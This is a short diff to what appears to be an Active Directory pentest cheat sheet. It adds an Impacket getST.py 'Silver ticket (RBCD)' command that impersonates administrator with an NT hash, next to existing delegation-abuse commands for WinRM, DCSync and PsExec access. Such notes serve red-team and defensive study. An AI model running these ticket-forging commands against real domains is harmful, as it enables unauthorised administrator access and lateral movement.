@@ -33,7 +33,12 @@ HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
 getST.py -debug -spn <svc>/<target_fqdn> -impersonate <target_user|Administrator> -dc-ip <dc_ip> <domain_fqdn>/<user>:'<password>'
 ```
 
-## Silver ticket (Resource-Based Constrained Delegation S4U2self)
+## Silver ticket (RBCD)
+```bash
+getST.py -spn "HOST/<target_fqdn>" -impersonate administrator -dc-ip <dc_ip> -hashes :<nt_hash>  '<domain_fqdn>/<samaccountname>'
+```
+
+## Silver ticket (RBCD / S4U2self)
 using the machine account TGT
 ```bash
 KRB5CCNAME=<computer_ccache>
